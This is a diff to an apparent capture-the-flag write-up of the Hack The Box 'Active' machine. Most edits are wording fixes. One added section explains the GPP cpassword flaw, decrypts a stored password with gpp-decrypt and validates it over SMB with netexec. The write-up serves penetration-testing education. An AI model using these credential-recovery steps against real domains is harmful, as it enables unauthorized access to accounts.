@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: netexec smb nullsession gpp grouppolicypreferences
+tags: netexec smb nullsession gpp grouppolicypreferences cpassword gpp-decrypt
 ---
 
 <br />
@@ -102,7 +102,7 @@ Relevant open ports:
 
 <br />
 
-The domain active.htb across multiple `LDAP` ports, so we add them to our `/etc/hosts` file:
+The domain active.htb across multiple `LDAP` ports, so we add it to our `/etc/hosts` file:
 
 <br />
 
@@ -155,7 +155,7 @@ SMB         10.10.10.100    445    DC               Users
 
 <br />
 
-As we can see, there is an interesting and less commonly share named `Replication`.
+As we can see, there is an interesting and less commonly seen share named `Replication`.
 
 We have read permissions on it, so we can log in with `smbclient`:
 
@@ -176,7 +176,7 @@ smb: \> ls
 
 <br />
 
-Inside, there is a `active.htb` directory with a lot of subdirectories and files.
+Inside, there is an `active.htb` directory with a lot of subdirectories and files.
 
 To further enumerate its contents, we download everything to our local machine.
 
@@ -197,7 +197,7 @@ getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
 
 <br />
 
-If we make a tree of the folder, we locate more easily interesting files:
+If we list the folder structure with `tree`, it's easier to locate interesting files:
 
 <br />
 
@@ -239,7 +239,7 @@ active.htb
 
 <br />
 
-The `groups.xml` call my attention:
+The `groups.xml` inmediately caught my attention:
 
 <br />
 
@@ -251,7 +251,7 @@ The `groups.xml` call my attention:
 
 <br />
 
-It has a `userName` and a `cpassword` field.
+It contains both a `userName` and a `cpassword` field.
 
 <br />
 
@@ -259,6 +259,43 @@ It has a `userName` and a `cpassword` field.
 
 <br />
 
+The `groups.xml` file is a typical artifact found in `GPP`. It is generated each time a new `Group Policy Preference` is created.
 
+This file contains an encrypted credential in the `cpassword` field.
+
+So, what is the problem?
+
+The issue is that the key used to encrypt the `cpassword` was publicly disclosed. Although this vulnerability was patched in `MS14-025`, it does not prevent exploitation of previously created entries.
+
+For a deeper understading of this attack, refer to [this post](https://n1chr0x.medium.com/unwrapping-gpp-exposing-the-cpassword-attack-vector-using-active-htb-machine-4d3b97e0ac43)
+
+<br />
+
+### gpp-decrypt:
+
+<br />
+
+The most commonly used tool to decrypt the `cpassword` is `gpp-decrypt`, written in Ruby.
+
+We can use it with the following:
+
+<br />
+
+```bash
+❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+```
+
+<br />
+
+Next, we verify the credentials using `netexec`:
+
+<br />
+
+```bash
+❯ netexec smb active.htb -u "svc_tgs" -p "GPPstillStandingStrong2k18"
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
+```
 
 <br />
